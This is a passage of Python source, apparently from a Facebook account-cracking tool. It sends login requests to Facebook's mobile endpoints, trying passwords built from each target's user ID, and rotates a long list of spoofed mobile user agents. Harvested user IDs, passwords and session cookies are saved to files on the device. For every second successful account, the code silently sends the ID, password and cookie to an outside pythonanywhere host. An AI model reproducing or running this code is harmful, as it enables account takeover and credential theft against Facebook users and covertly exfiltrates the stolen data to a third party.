            'fr': '1luwxyfC0S3PqSGOB.AWdHWSlIFgbTsyGIpb0ybBWJfd90ljXfeYezIDp1sNzBIA5oVJU.BoRC9Z..AAA.0.0.BoRDJU.AWcx--m4gr-h5rmVlUlEexIex9Y',}
            params = {
            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
            'type': 'action',
            '__bkv': 'e787cb1606ebe4cc6aaf5a1ce304f07c3da0663045060614c1cd6806596c46e6',}
            data = {
    '__aaid': '0',
    '__user': '0',
    '__a': '1',
    '__req': 'a',
    '__hs': '20246.BP:wbloks_caa_pkg.2.0...0',
    'dpr': '3',
    '__ccg': 'EXCELLENT',
    '__rev': '1023608600',
    '__s': ':f95eey:i9v0n0',
    '__hsi': '7513185148771233093',
    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
    'fb_dtsg': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
    'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
    'params': json.dumps({
        "params": json.dumps({
            "server_params": {
                "credential_type": "password",
                "username_text_input_id": "7w9omu:68",
                "password_text_input_id": "7w9omu:69",
                "login_source": "Login",
                "login_credential_type": "none",
                "server_login_source": "login",
                "ar_event_source": "login_home_page",
                "should_trigger_override_login_success_action": 0,
                "should_trigger_override_login_2fa_action": 0,
                "is_caa_perf_enabled": 0,
                "reg_flow_source": "login_home_native_integration_point",
                "caller": "gslr",
                "is_from_landing_page": 0,
                "is_from_empty_password": 0,
                "is_from_aymh": 0,
                "is_from_password_entry_page": 0,
                "is_from_assistive_id": 0,
                "is_from_msplit_fallback": 0,
                "two_step_login_type": "one_step_login",
                "INTERNAL__latency_qpl_marker_id": 36707139,
                "INTERNAL__latency_qpl_instance_id": "47746277400427",
                "device_id": None,
                "family_device_id": None,
                "waterfall_id": "123dc61e-79b8-44ee-8c3d-6da87a95cea7",
                "offline_experiment_group": None,
                "layered_homepage_experiment_group": None,
                "is_platform_login": 0,
                "is_from_logged_in_switcher": 0,
                "is_from_logged_out": 0,
                "access_flow_version": "pre_mt_behavior"
            },
            "client_input_params": {
                "machine_id": "",
                "cloud_trust_token": None,
                "contact_point": uid,
                "password": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
                "accounts_list": [],
                "fb_ig_device_id": [],
                "secure_family_device_id": "",
                "encrypted_msisdn": "",
                "headers_infra_flow_id": "",
                "try_num": 1,
                "login_attempt_count": 1,
                "event_flow": "login_manual",
                "event_step": "home_page",
                "openid_tokens": {},
                "block_store_machine_id": "",
                "auth_secure_device_id": "",
                "client_known_key_hash": "",
                "has_whatsapp_installed": 0,
                "sso_token_map_json_string": "",
                "should_show_nested_nta_from_aymh": 0,
                "password_contains_non_ascii": "false",
                "has_granted_read_contacts_permissions": 0,
                "has_granted_read_phone_permissions": 0,
                "app_manager_id": "",
                "aymh_accounts": [],
                "lois_settings": {
                    "lois_token": ""
                }
            }
        })
    }),
}
            headers = {
            'Host': 'mtouch.facebook.com',
            # 'content-length': str(len(str(data))), # Content-length is usually set by requests
            'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'user-agent': ____PO_CO____(), # Using the dynamic UA generator
            'x-response-format': 'JSONStream',
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'viewport-width': '360',
            'x-requested-with': 'XMLHttpRequest',
            'x-asbd-id': '129477',
            'dpr': '2',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua-platform': '"Android"',
            'accept': '*/*',
            'origin': 'https://mtouch.facebook.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
            'sec-fetch-dest': 'empty',
            'referer': 'https://mtouch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
            url = "https://p.facebook.com/async/wbloks/fetch/"
            po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
            response = Session.cookies.get_dict().keys()
            if "c_user" in response:
                cok = Session.cookies.get_dict()
                cid = cok["c_user"]
                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                check = check_lock(cid)
                if "live" in check:
                    if '%3A-1%3A-1' in coki:
                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                        break
                    else:
                        bkas.append(cid)
                        if len(bkas)% 2 == 0:
                           statusok = (f"{cid}|{pw}|{coki}")
                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                        else:
                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
                           print(f" {green}Cookie : {green}{coki}")
                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                           oks.append(cid)
                           break
                else:
                    break
            elif 'checkpoint' in response:
                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except ce:
        time.sleep(20)
    except Exception as error:
        #print({error})
        pass

def cracker(uid, pwx, tl):
    global oks
    global cps
    global twf
    global loop
    global bkas
    sys.stdout.write(f"\r {green}(SUMON) ({loop}) (OK-{len(oks)})\r"),
    sys.stdout.flush()
    try:
        first6digit = uid[0:6]
        first7digit = uid[0:7]
        last6digit = uid[int(len(uid))-6:]
        last7digit = uid[int(len(uid))-7:]
        fullnumber = uid
        for pw in pwx:
            pw = pw.replace("first6", first6digit)
            pw = pw.replace("first7", first7digit)
            pw = pw.replace("last6", last6digit)
            pw = pw.replace("last7", last7digit)
            pw = pw.replace("fullnumber", fullnumber)
            rua = random.choice([
                "Mozilla/5.0 (Linux; Android 10; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 12; V2050 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]",
                "Mozilla/5.0 (Linux; Android 11; M2010J19SI Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]",
                "Mozilla/5.0 (Linux; Android 12; FNE-NX9 Build/HONORFNE-N29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]",
                "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1726 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.132 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 13; SM-S901B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]",
                "Dalvik/2.1.0 (Linux; U; Android 13; SCG14 Build/TP1A.220624.014)",
                "Mozilla/5.0 (Linux; Android 7.0; SM-G925F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]",
                "Mozilla/5.0 (Linux; Android 12; CPH2271 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]",
                "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
                "Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6731 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 11; Infinix X698 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;] FBNV/1",
"Mozilla/5.0 (Linux; Android 12; Infinix X666B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.29 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.0.0.44.104;] FBNV/1",
"Mozilla/5.0 (Linux; Android 13; Infinix X6832 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.66 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.66 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.0.0.44.104;]",
"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;] FBNV/1",
"Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",
"Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6832 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;] FBNV/5",
"Mozilla/5.0 (Linux; Android 13; Infinix X6710 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",
"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]",
"Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 8.1.0; BBF100-6 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 OPT/6B8575B",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.3.3 Mobile/15E148",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.3.3 Mobile/15E148",
"Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 OPT/1.0.9",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.2.18 Mobile/15E148",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.3.0 Mobile/15E148",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 OPT/1.14.51",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.2.13 Mobile/15E148"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.2.16 Mobile/15E148",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.4.1 Mobile/15E148",
"Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013 Build/RKQ1.201217.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 OPT/1.16.56",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.2.13 Mobile/15E148",
"Mozilla/5.0 (Linux; Android 8.0.0; FIG-LX1 Build/HUAWEIFIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPT/1.16.56",
"Mozilla/5.0 (Linux; Android 5.0.1; GT-I9505 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 OPT/1.10.37",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36 OPT/1.10.35",
"Mozilla/5.0 (Linux; Android 7.1.2; M6 Note Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36 OPT/1.16.56",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-J701F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPT/1.18.70",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6731 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 11; Infinix X698 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;] FBNV/1",
"Mozilla/5.0 (Linux; Android 12; Infinix X666B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.29 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.0.0.44.104;] FBNV/1",
"Mozilla/5.0 (Linux; Android 13; Infinix X6832 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.66 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.66 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.0.0.44.104;]",
"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;] FBNV/1",
"Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",
"Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6832 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;] FBNV/5",
"Mozilla/5.0 (Linux; Android 13; Infinix X6710 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/453.0.0.40.107;]",
"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]",
"Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/454.1.0.49.104;]",
"Mozilla/5.0 (Linux; Android 8.1.0; BBF100-6 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 OPT/6B8575B",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.3.3 Mobile/15E148",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.3.3 Mobile/15E148",
"Mozilla/5.0 (Linux; Android 13; 22101316UCP Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]", 
"Mozilla/5.0 (Linux; Android 12; 22101316UCP Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.227 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]",
"Mozilla/5.0 (Linux; Android 12; 22101316UCP Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]",
"Mozilla/5.0 (Linux; U; Android 7.0; en-in; Redmi Note 3 Pro Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.3.8",
"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 3 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 OPT/1.0.9",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.2.18 Mobile/15E148",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.3.0 Mobile/15E148",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 OPT/1.14.51",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.2.13 Mobile/15E148"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.2.16 Mobile/15E148",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.4.1 Mobile/15E148",
"Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013 Build/RKQ1.201217.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 OPT/1.16.56",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.2.13 Mobile/15E148",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; FIG-LX1 Build/HUAWEIFIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPT/1.16.56",
"Mozilla/5.0 (Linux; Android 5.0.1; GT-I9505 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 OPT/1.10.37",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36 OPT/1.10.35",
"Mozilla/5.0 (Linux; Android 7.1.2; M6 Note Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36 OPT/1.16.56",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-J701F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPT/1.18.70",
"Mozilla/5.0 (Linux; Android 9; Redmi 6 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 OPT/1.16.62",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi Go Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 OPT/1.10.35",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-J415FN Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 OPT/1.16.56",
"Mozilla/5.0 (Linux; Android 9; SM-A530F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.111 Mobile Safari/537.36 OPT/1.20.73",
"Mozilla/5.0 (Linux; Android 7.0; YS900 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Safari/537.36 OPT/1.14.51",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi Go Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 OPT/1.10.35",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-J415FN Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 OPT/1.16.56",
"Mozilla/5.0 (Linux; Android 8.0.0; ANE-LX1 Build/HUAWEIANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 OPT/1.13.48",
